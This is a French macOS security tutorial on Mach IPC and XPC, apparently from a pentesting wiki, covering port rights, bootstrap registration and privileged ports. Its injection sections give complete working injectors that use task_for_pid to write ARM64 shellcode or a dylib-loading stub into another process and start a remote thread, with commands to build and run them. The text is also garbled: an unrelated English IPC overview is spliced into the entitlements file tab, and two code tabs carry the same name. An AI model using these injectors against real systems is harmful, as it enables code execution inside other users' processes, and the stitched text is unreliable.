# IPC Mach - Communication inter-processus

Mach utilise des **tâches** comme **unité la plus petite** pour partager des ressources, et chaque tâche peut contenir **plusieurs threads**. Ces **tâches et threads sont mappés 1:1 sur les processus et threads POSIX**.

La communication entre les tâches se fait via la communication inter-processus (IPC) de Mach, en utilisant des canaux de communication unidirectionnels. **Les messages sont transférés entre les ports**, qui agissent comme des **files d'attente de messages** gérées par le noyau.

Les droits de port, qui définissent les opérations qu'une tâche peut effectuer, sont essentiels à cette communication. Les **droits de port** possibles sont :

* **Droit de réception**, qui permet de recevoir des messages envoyés au port. Les ports Mach sont des files d'attente MPSC (multiple-producteur, unique-consommateur), ce qui signifie qu'il ne peut y avoir **qu'un seul droit de réception pour chaque port** dans tout le système (contrairement aux pipes, où plusieurs processus peuvent tous détenir des descripteurs de fichier pour l'extrémité de lecture d'un pipe).
* Une **tâche avec le droit de réception** peut recevoir des messages et **créer des droits d'envoi**, lui permettant d'envoyer des messages. À l'origine, seule la **propre tâche a le droit de réception sur son port**.
* **Droit d'envoi**, qui permet d'envoyer des messages au port.
* **Droit d'envoi unique**, qui permet d'envoyer un message au port puis de disparaître.
* **Droit de jeu de ports**, qui indique un _ensemble de ports_ plutôt qu'un seul port. Le défilement d'un message à partir d'un ensemble de ports défile un message à partir de l'un des ports qu'il contient. Les ensembles de ports peuvent être utilisés pour écouter plusieurs ports simultanément, un peu comme `select`/`poll`/`epoll`/`kqueue` dans Unix.
* **Nom mort**, qui n'est pas un droit de port réel, mais simplement un espace réservé. Lorsqu'un port est détruit, tous les droits de port existants sur le port deviennent des noms morts.

**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant d'envoyer des messages en retour. **Les droits d'ENVOI peuvent également être clonés, de sorte qu'une tâche peut dupliquer et donner le droit à une troisième tâche**. Cela, combiné à un processus intermédiaire connu sous le nom de **serveur de démarrage**, permet une communication efficace entre les tâches.

#### Étapes :

Comme mentionné, pour établir le canal de communication, le **serveur de démarrage** (**launchd** sur Mac) est impliqué.

1. La tâche **A** initie un **nouveau port**, obtenant un **droit de réception** dans le processus.
2. La tâche **A**, étant le détenteur du droit de réception, **génère un droit d'envoi pour le port**.
3. La tâche **A** établit une **connexion** avec le **serveur de démarrage**, fournissant le **nom de service du port** et le **droit d'envoi** par une procédure connue sous le nom d'enregistrement de démarrage.
4. La tâche **B** interagit avec le **serveur de démarrage** pour exécuter une **recherche de démarrage pour le service**. Si elle réussit, le **serveur duplique le droit d'envoi** reçu de la tâche A et **le transmet à la tâche B**.
5. Après avoir acquis un droit d'envoi, la tâche **B** est capable de **formuler** un **message** et de l'envoyer **à la tâche A**.

Le serveur de démarrage ne peut pas authentifier le nom de service revendiqué par une tâche. Cela signifie qu'une **tâche** pourrait potentiellement **usurper n'importe quelle tâche système**, en revendiquant faussement un nom de service d'autorisation, puis en approuvant chaque demande.

Ensuite, Apple stocke les **noms des services fournis par le système** dans des fichiers de configuration sécurisés, situés dans des répertoires protégés par SIP : `/System/Library/LaunchDaemons` et `/System/Library/LaunchAgents`. À côté de chaque nom de service, le **binaire associé est également stocké**. Le serveur de démarrage créera et conservera un **droit de réception pour chacun de ces noms de service**.

Pour ces services prédéfinis, le **processus de recherche diffère légèrement**. Lorsqu'un nom de service est recherché, launchd démarre le service dynamiquement. Le nouveau flux de travail est le suivant :

* La tâche **B** initie une **recherche de démarrage** pour un nom de service.
* **launchd** vérifie si la tâche est en cours d'exécution et si ce n'est pas le cas, **la démarre**.
* La tâche **A** (le service) effectue un **enregistrement de démarrage**. Ici, le **serveur de démarrage crée un droit d'envoi, le retient et transfère le droit de réception à la tâche A**.
* launchd duplique le **droit d'envoi et l'envoie à la tâche B**.

Cependant, ce processus ne s'applique qu'aux tâches système prédéfinies. Les tâches non système fonctionnent toujours comme décrit initialement, ce qui pourrait potentiellement permettre l'usurpation.
### Exemple de code

Notez comment l'**expéditeur** **alloue** un port, crée un **droit d'envoi** pour le nom `org.darlinghq.example` et l'envoie au **serveur de démarrage** tandis que l'expéditeur a demandé le **droit d'envoi** de ce nom et l'a utilisé pour **envoyer un message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Ports privilégiés

* **Port hôte**: Si un processus a le privilège **Envoyer** sur ce port, il peut obtenir des **informations** sur le **système** (par exemple, `host_processor_info`).
* **Port privilégié hôte**: Un processus avec le droit **Envoyer** sur ce port peut effectuer des actions **privilégiées** comme le chargement d'une extension de noyau. Le **processus doit être root** pour obtenir cette autorisation.
* De plus, pour appeler l'API **`kext_request`**, il est nécessaire de disposer de l'attribution **`com.apple.private.kext`**, qui n'est donnée qu'aux binaires Apple.
* **Port de nom de tâche**: Une version non privilégiée du _port de tâche_. Il fait référence à la tâche, mais ne permet pas de la contrôler. La seule chose qui semble être disponible à travers elle est `task_info()`.
* **Port de tâche** (alias port de noyau)**:** Avec l'autorisation d'envoi sur ce port, il est possible de contrôler la tâche (lecture/écriture de mémoire, création de threads...).
* Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port n'est **hérité** qu'à travers **`exec()`**; une nouvelle tâche créée avec `fork()` obtient un nouveau port de tâche (dans un cas particulier, une tâche obtient également un nouveau port de tâche après l'exécution d'un binaire suid). La seule façon de lancer une tâche et d'obtenir son port est d'effectuer la ["danse d'échange de port"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) tout en faisant un `fork()`.
* Voici les restrictions d'accès au port (à partir de `macos_task_policy` du binaire `AppleMobileFileIntegrity`):
* Si l'application a l'attribution **`com.apple.security.get-task-allow`**, les processus de l'**utilisateur peuvent accéder au port de tâche**, (communément ajouté par Xcode pour le débogage). Le processus de **notarisation** ne le permettra pas pour les versions de production.
* Les applications ayant l'attribution **`com.apple.system-task-ports`** peuvent obtenir le **port de tâche pour n'importe quel** processus, sauf le noyau. Dans les versions antérieures, il était appelé **`task_for_pid-allow`**. Cela n'est accordé qu'aux applications Apple.
* **Root peut accéder aux ports de tâche** des applications **non** compilées avec un **runtime renforcé** (et non pas d'Apple).

### Injection de processus Shellcode via le port de tâche&#x20;

Vous pouvez récupérer un shellcode à partir de :

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:

- **Mach ports**: a low-level IPC mechanism used by the kernel and many system services.
- **XPC**: a high-level IPC mechanism used by many system services and applications.
- **Distributed Objects**: a legacy IPC mechanism used by some system services and applications.

Each IPC mechanism has its own security considerations and attack surface. In this section, we will focus on Mach ports and XPC.

## Mach Ports

Mach ports are a low-level IPC mechanism used by the kernel and many system services. Mach ports are used to send messages between processes and to create inter-process communication channels. Mach ports are identified by a port name, which is an integer value. Processes can send messages to a port by sending a message to the port name. Processes can receive messages by waiting for a message on a port.

Mach ports are a powerful IPC mechanism that can be used to perform a wide range of tasks, including:

- **Inter-process communication**: processes can use Mach ports to communicate with each other and share data.
- **Process control**: processes can use Mach ports to control other processes, such as suspending or terminating them.
- **Kernel communication**: kernel extensions can use Mach ports to communicate with the kernel and other kernel extensions.

Mach ports are a critical part of the macOS security model. Mach ports are used by many system services and applications to communicate with each other and with the kernel. Mach ports are also used by macOS to implement sandboxing and other security features.

Mach ports are protected by a set of access controls called **port rights**. Port rights are used to control which processes can send messages to a port, receive messages from a port, or perform other operations on a port. Port rights are managed by the kernel and are enforced by the Mach port subsystem.

Mach ports can be a source of security vulnerabilities if they are not properly secured. Attackers can use Mach ports to perform a variety of attacks, including:

- **Privilege escalation**: attackers can use Mach ports to communicate with privileged processes and execute code with elevated privileges.
- **Information disclosure**: attackers can use Mach ports to leak sensitive information from other processes.
- **Denial of service**: attackers can use Mach ports to crash or hang other processes.

To protect against these attacks, it is important to properly secure Mach ports and limit access to them. This can be done by using **entitlements** and other access controls.

## XPC

XPC is a high-level IPC mechanism used by many system services and applications. XPC provides a simple and secure way for processes to communicate with each other and share data. XPC is based on a client-server model, where a client process sends messages to a server process and the server process responds to the messages.

XPC provides several security features, including:

- **Sandboxing**: XPC services can be sandboxed to limit their access to system resources.
- **Code signing**: XPC services can be code signed to ensure that they have not been tampered with.
- **Entitlements**: XPC services can be granted entitlements to control their access to system resources.

XPC services are defined using **XPC service bundles**. An XPC service bundle is a directory that contains an executable file and a property list file that describes the service. The property list file contains information about the service, including its name, version, and entitlements.

XPC services are registered with the system using a special **launchd** configuration file. The launchd configuration file specifies the executable file for the service and the conditions under which the service should be launched.

XPC services can be a source of security vulnerabilities if they are not properly secured. Attackers can use XPC services to perform a variety of attacks, including:

- **Privilege escalation**: attackers can use XPC services to communicate with privileged processes and execute code with elevated privileges.
- **Information disclosure**: attackers can use XPC services to leak sensitive information from other processes.
- **Denial of service**: attackers can use XPC services to crash or hang other processes.

To protect against these attacks, it is important to properly secure XPC services and limit access to them. This can be done by using sandboxing, code signing, entitlements, and other access controls.

## References

- [Mach Ports Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ConcurrencyProgrammingGuide/InterThreadCommunication/InterThreadCommunication.html)
- [XPC Services Programming Guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compilez** le programme précédent et ajoutez les **droits** nécessaires pour pouvoir injecter du code avec le même utilisateur (sinon vous devrez utiliser **sudo**).

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid>", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### Injection de processus Dylib via le port de tâche

Dans macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant l'API **posix `pthread`**. Le thread que nous avons généré dans l'injection précédente a été généré en utilisant l'API Mach, donc **il n'est pas conforme à posix**.

Il était possible d'**injecter un simple shellcode** pour exécuter une commande car il **n'avait pas besoin de travailler avec des API conformes à posix**, seulement avec Mach. Des injections **plus complexes** nécessiteraient donc que le **thread** soit également **conforme à posix**.

Par conséquent, pour **améliorer le shellcode**, il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger notre dylib** depuis le système.

Vous pouvez trouver des **dylibs d'exemple** dans (par exemple celui qui génère un journal que vous pouvez ensuite écouter) :

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Création de pthread à partir du thread mach @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Écrire le shellcode dans la mémoire allouée
kr = mach_vm_write(remoteTask,                   // Port de tâche
remoteCode64,                 // Adresse virtuelle (destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Longueur de la source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossible d'écrire dans la mémoire du thread distant : Erreur %s\n", mach_error_string(kr));
return (-3);
}


// Définir les autorisations sur la mémoire allouée pour le code
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossible de définir les autorisations de mémoire pour le code du thread distant : Erreur %s\n", mach_error_string(kr));
return (-4);
}

// Définir les autorisations sur la mémoire allouée pour la pile
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossible de définir les autorisations de mémoire pour la pile du thread distant : Erreur %s\n", mach_error_string(kr));
return (-4);
}


// Créer un thread pour exécuter le shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // c'est la vraie pile
//remoteStack64 -= 8;  // besoin d'un alignement de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pile distante 64  0x%llx, le code distant est %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Impossible de créer un thread distant : erreur %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Utilisation : %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_ : chemin vers un dylib sur le disque\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib introuvable\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Injection de thread via le port de tâche <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informations de base

XPC, qui signifie Communication inter-processus XNU (le noyau utilisé par macOS), est un framework pour la **communication entre les processus** sur macOS et iOS. XPC fournit un mécanisme pour effectuer des **appels de méthode asynchrones et sûrs entre différents processus** sur le système. C'est une partie du paradigme de sécurité d'Apple, permettant la **création d'applications séparées par privilèges** où chaque **composant** s'exécute avec **seulement les autorisations dont il a besoin** pour faire son travail, limitant ainsi les dommages potentiels d'un processus compromis.

XPC utilise une forme de communication inter-processus (IPC), qui est un ensemble de méthodes pour différents programmes s'exécutant sur le même système pour s'envoyer des données.

Les principaux avantages de XPC comprennent :

1. **Sécurité** : En séparant le travail en différents processus, chaque processus peut se voir accorder uniquement les autorisations dont il a besoin. Cela signifie que même si un processus est compromis, il a une capacité limitée à nuire.
2. **Stabilité** : XPC aide à isoler les plantages dans le composant où ils se produisent. Si un processus plante, il peut être redémarré sans affecter le reste du système.
3. **Performance** : XPC permet une concurrence facile, car différentes tâches peuvent être exécutées simultanément dans différents processus.

Le seul **inconvénient** est que **séparer une application en plusieurs processus** les faisant communiquer via XPC est **moins efficace**. Mais dans les systèmes d'aujourd'hui, cela n'est presque pas perceptible et les avantages sont bien meilleurs.

Un exemple peut être vu dans QuickTime Player, où un composant utilisant XPC est responsable du décodage vidéo. Le composant est spécifiquement conçu pour effectuer des tâches de calcul, ainsi, en cas de violation, il ne fournirait pas de gains utiles à l'attaquant, tels que l'accès aux fichiers ou au réseau.

### Services XPC spécifiques à l'application

